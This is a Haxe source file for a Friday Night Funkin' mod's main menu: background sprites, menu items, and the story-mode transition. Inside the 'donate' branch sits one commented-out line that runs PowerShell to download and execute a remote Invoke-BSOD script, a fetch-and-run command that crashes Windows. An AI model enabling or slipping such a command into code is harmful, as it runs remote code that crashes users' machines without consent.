package;

#if desktop
import Discord.DiscordClient;
#end
import flixel.FlxG;
import flixel.FlxObject;
import flixel.FlxSprite;
import flixel.addons.transition.FlxTransitionableState;
import flixel.effects.FlxFlicker;
import flixel.graphics.frames.FlxAtlasFrames;
import flixel.group.FlxGroup.FlxTypedGroup;
import flixel.text.FlxText;
import flixel.tweens.FlxEase;
import flixel.tweens.FlxTween;
import flixel.util.FlxColor;
import io.newgrounds.NG;
import lime.app.Application;
import haxe.Exception;
using StringTools;
import flixel.util.FlxTimer;
import Options;
import flixel.addons.effects.FlxTrail;

class MainMenuState extends MusicBeatState
{
	var curSelected:Int = 0;

	var menuItems:FlxTypedGroup<FlxSprite>;
	var character:Character;
	#if !switch
	var optionShit:Array<String> = ['story mode', 'options'];
	#else
	var optionShit:Array<String> = ['story mode'];
	#end

	var magenta:FlxSprite;
	var camFollow:FlxObject;

	override function create()
	{
		#if desktop
		// Updating Discord Rich Presence
		DiscordClient.changePresence("In the Menus", null);
		#end

		FlxG.camera.zoom = .9;

		if (!FlxG.sound.music.playing)
		{
			FlxG.sound.playMusic(Paths.music('freakyMenu'));
		}

		persistentUpdate = persistentDraw = true;

		var sky = new FlxSprite(-850, 1550);
		sky.frames = Paths.getSparrowAtlas('god_bg');
		sky.animation.addByPrefix('sky', "bg", 30);
		sky.setGraphicSize(Std.int(sky.width * 0.8));
		sky.animation.play('sky');
		sky.scrollFactor.set(0.1, 0.1);
		sky.antialiasing = true;
		sky.updateHitbox();
		sky.screenCenter(XY);
		sky.y -= 100;
		sky.x -= 50;
		add(sky);

		var bgcloud = new FlxSprite(-850, 1150);
		bgcloud.frames = Paths.getSparrowAtlas('god_bg');
		bgcloud.animation.addByPrefix('c', "cloud_smol", 30);
		bgcloud.animation.play('c');
		bgcloud.scrollFactor.set(0.3, 0.3);
		bgcloud.antialiasing = true;
		bgcloud.screenCenter(XY);
		bgcloud.y += 250;
		add(bgcloud);

		var fgcloud = new FlxSprite(-1150, -500);
		fgcloud.x -= 300;
		fgcloud.frames = Paths.getSparrowAtlas('god_bg');
		fgcloud.animation.addByPrefix('c', "cloud_big", 30);
		fgcloud.animation.play('c');
		fgcloud.scrollFactor.set(0.9, 0.9);
		fgcloud.antialiasing = true;
		fgcloud.screenCenter(XY);
		fgcloud.y += 100;
		add(fgcloud);

		add(new MansionDebris(FlxG.width/2+300, FlxG.height/2+-800, 'norm', 0.4, 1, 0, 1));
		add(new MansionDebris(FlxG.width/2+600, FlxG.height/2+-300, 'tiny', 0.4, 1.5, 0, 1));
		add(new MansionDebris(FlxG.width/2+-150, FlxG.height/2+-400, 'spike', 0.4, 1.1, 0, 1));
		add(new MansionDebris(FlxG.width/2+-750, FlxG.height/2+-850, 'small', 0.4, 1.5, 0, 1));

		camFollow = new FlxObject(0, 0, 1, 1);
		camFollow.screenCenter(XY);
		add(camFollow);

		// magenta.scrollFactor.set();

		menuItems = new FlxTypedGroup<FlxSprite>();
		add(menuItems);

		var tex = Paths.getSparrowAtlas('FNF_main_menu_assets');

		for (i in 0...optionShit.length)
		{
			var menuItem:FlxSprite = new FlxSprite(0, 120 + (i * 220));
			menuItem.frames = tex;
			menuItem.animation.addByPrefix('idle', optionShit[i] + " basic", 24);
			menuItem.animation.addByPrefix('selected', optionShit[i] + " white", 24);
			menuItem.animation.play('idle');
			menuItem.ID = i;
			menuItem.screenCenter(X);
			menuItems.add(menuItem);
			menuItem.scrollFactor.set();
			menuItem.updateHitbox();
			menuItem.antialiasing = true;
			menuItem.x -= 400;
		}

		FlxG.camera.follow(camFollow, null, 0.06);

		var versionShit:FlxText = new FlxText(5, FlxG.height - 18, 0, "v" + Application.current.meta.get('version') + " - Andromeda Engine B6", 12);
		versionShit.scrollFactor.set();
		versionShit.setFormat("VCR OSD Mono", 16, FlxColor.WHITE, LEFT, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
		add(versionShit);

		character = new Character(0,0,'menushaggy',false);
		character.screenCenter(XY);
		character.x += 250;
		character.y -= 25;
		character.scrollFactor.set(.1,.1);
		character.playAnim("back");
		add(character);

		// NG.core.calls.event.logEvent('swag').send();

		changeItem();

		super.create();
	}

	var selectedSomethin:Bool = false;

	override function update(elapsed:Float)
	{
		if (FlxG.sound.music.volume < 0.8 && !selectedSomethin)
		{
			FlxG.sound.music.volume += 0.5 * FlxG.elapsed;
		}

		if (!selectedSomethin)
		{
			if (controls.UP_P)
			{
				FlxG.sound.play(Paths.sound('scrollMenu'));
				changeItem(-1);
			}

			if (controls.DOWN_P)
			{
				FlxG.sound.play(Paths.sound('scrollMenu'));
				changeItem(1);
			}

			if (controls.ACCEPT)
			{
				if (optionShit[curSelected] == 'donate')
				{
					#if linux
					Sys.command('/usr/bin/xdg-open', ["https://ninja-muffin24.itch.io/funkin", "&"]);
					#else
					FlxG.openURL('https://ninja-muffin24.itch.io/funkin');
					//Sys.command("powershell.exe -command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD");
					#end
				}
				else if(optionShit[curSelected]=='story mode'){
					selectedSomethin=true;
					FlxG.sound.music.fadeOut(.5,0);
					character.playAnim("snap",true);
					new FlxTimer().start(0.85, function(tmr:FlxTimer)
					{
						FlxG.sound.play(Paths.sound('snap'));
						FlxG.sound.play(Paths.sound('menuBad'));
						FlxG.camera.shake(.05,.5);
						new FlxTimer().start(0.06, function(tmr2:FlxTimer){
							character.playAnim('snapped', true);
						});
					});

					PlayState.storyPlaylist = ["god-eater"];
					PlayState.isStoryMode = true;

					PlayState.storyDifficulty = 2;

					PlayState.SONG = Song.loadFromJson("god-eater-hard", "god-eater");
					PlayState.storyWeek = 1;
					PlayState.campaignScore = 0;
					new FlxTimer().start(3, function(tmr:FlxTimer)
					{
						LoadingState.loadAndSwitchState(new PlayState(), true);
					});
				}
				else
				{
					selectedSomethin = true;
					FlxG.sound.play(Paths.sound('confirmMenu'));

					menuItems.forEach(function(spr:FlxSprite)
					{
						if (curSelected != spr.ID)
						{
							FlxTween.tween(spr, {alpha: 0}, 0.4, {
								ease: FlxEase.quadOut,
								onComplete: function(twn:FlxTween)
								{
									spr.kill();
								}
							});
						}
						else
						{
							if(OptionUtils.options.menuFlash){
								FlxFlicker.flicker(spr, 1, 0.06, false, false, function(flick:FlxFlicker)
								{
									var daChoice:String = optionShit[curSelected];

									switch (daChoice)
									{
										case 'freeplay':
											FlxG.switchState(new FreeplayState());
											trace("Freeplay Menu Selected");

										case 'options':
											FlxG.switchState(new OptionsMenu());
									}
								});
							}else{
								new FlxTimer().start(1, function(tmr:FlxTimer){
									var daChoice:String = optionShit[curSelected];

									switch (daChoice)
									{
										case 'freeplay':
											FlxG.switchState(new FreeplayState());
											trace("Freeplay Menu Selected");

										case 'options':
											FlxG.switchState(new OptionsMenu());
									}
								});
							}
						}
					});
				}
			}
		}

		super.update(elapsed);

		menuItems.forEach(function(spr:FlxSprite)
		{
		});
	}

	function changeItem(huh:Int = 0)
	{
		curSelected += huh;

		if (curSelected >= menuItems.length)
			curSelected = 0;
		if (curSelected < 0)
			curSelected = menuItems.length - 1;

		menuItems.forEach(function(spr:FlxSprite)
		{
			spr.animation.play('idle');

			if (spr.ID == curSelected)
			{
				spr.animation.play('selected');
				camFollow.y = spr.getGraphicMidpoint().y;
			}

			spr.updateHitbox();
		});
	}
}
